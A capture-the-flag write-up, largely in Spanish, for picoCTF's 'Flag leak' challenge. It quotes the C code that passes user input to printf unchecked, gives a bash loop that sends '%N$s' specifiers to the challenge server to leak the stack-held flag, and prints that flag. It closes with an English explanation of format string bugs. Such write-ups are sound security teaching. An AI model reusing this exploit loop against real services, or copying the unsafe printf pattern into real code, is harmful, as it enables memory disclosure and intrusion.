# Flag leak


## Descripcion
Story telling class 1/2I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/93/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/93/vuln.c). And connect with it using:`nc saturn.picoctf.net 54358`
## Pistas
Format Strings

## Solucion
analizamos el codigo y encontramos la siguiente linea
```c
void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

```
vemos que de entrada formatea el string dandonos un acceso de vulnerabilidad a las entradas de memoria si se pasa el parametro adecuado. creamo la siguiente funcion para revisar todas las locaciones de memoria posibles
```bash
for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 54358 | grep CTF; done
```
## Bandera
picoCTF{L34k1ng_Fl4g_0ff_St4ck_5e16d521}
## Notas adicionales
The string format vulnerability, also known as "format string vulnerability" or "format string attack," is a type of security vulnerability that occurs when a program uses user-supplied input as a format string without proper validation or sanitization. This vulnerability is typically found in languages that support formatted output functions, such as C, C++, and some scripting languages.

The vulnerability arises when an attacker can control the format string argument passed to a formatting function, such as `printf` or `sprintf`, and can exploit the behavior of these functions to read or write data in unintended memory locations. The format string can contain format specifiers, such as `%s` for strings, `%d` for integers, etc., which are intended to be replaced with corresponding values.

## Referencias
https://resources.infosecinstitute.com/topic/how-to-exploit-format-string-vulnerabilities/